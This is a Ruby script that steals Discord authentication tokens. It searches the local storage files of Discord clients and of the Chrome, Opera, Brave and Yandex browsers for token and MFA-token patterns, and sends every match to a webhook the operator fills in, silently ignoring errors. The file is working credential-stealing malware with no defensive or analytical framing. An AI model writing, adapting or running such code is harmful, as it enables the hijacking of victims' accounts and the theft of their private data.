require 'net/http'
require 'json'

class TokenExtractor
  def initialize(path)
    @path = path
    @tokens = []
  end

  def find_tokens
    path = "#{@path}\\Local Storage\\leveldb"

    Dir.glob("#{path}/*.{log,ldb}").each do |file_name|
      File.readlines(file_name, encoding: 'ISO-8859-1').each do |line|
        line.strip!

        [/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/].each do |regex|
          @tokens.concat(line.scan(regex))
        end
      end
    end
  end

  def tokens
    @tokens
  end
end

class WebhookSender
  def initialize(webhook_url)
    @webhook_url = webhook_url
    @headers = {
      'Content-Type' => 'application/json',
      'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
  end

  def send_message(message)
    payload = { 'content' => message }.to_json

    begin
      uri = URI(@webhook_url)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true
      req = Net::HTTP::Post.new(uri.path, @headers)
      req.body = payload
      http.request(req)
    rescue
    end
  end
end

def main
  webhook_url = 'ur webhook'  # Replace with actual webhook URL
  ping_me = false

  token_extractor = TokenExtractor.new(ENV['APPDATA'])
  webhook_sender = WebhookSender.new(webhook_url)

  message = ''
  if ping_me
    message += '@everyone'
  end

  paths = {
    'Discord' => 'Discord',
    'Discord Canary' => 'discordcanary',
    'Discord PTB' => 'discordptb',
    'Google Chrome' => 'Google\\Chrome\\User Data\\Default',
    'Opera' => 'Opera Software\\Opera Stable',
    'Brave' => 'BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex' => 'Yandex\\YandexBrowser\\User Data\\Default'
  }

  paths.each do |platform, path|
    full_path = "#{ENV['LOCALAPPDATA']}\\#{path}"
    next unless Dir.exist?(full_path)

    token_extractor = TokenExtractor.new(full_path)
    token_extractor.find_tokens
    tokens = token_extractor.tokens

    message += "\n**#{platform}**\n```\n"
    if tokens.any?
      message += tokens.join("\n")
    else
      message += 'No tokens found.'
    end
    message += '```'
  end

  webhook_sender.send_message(message)
end

if __FILE__ == $0
  main
end
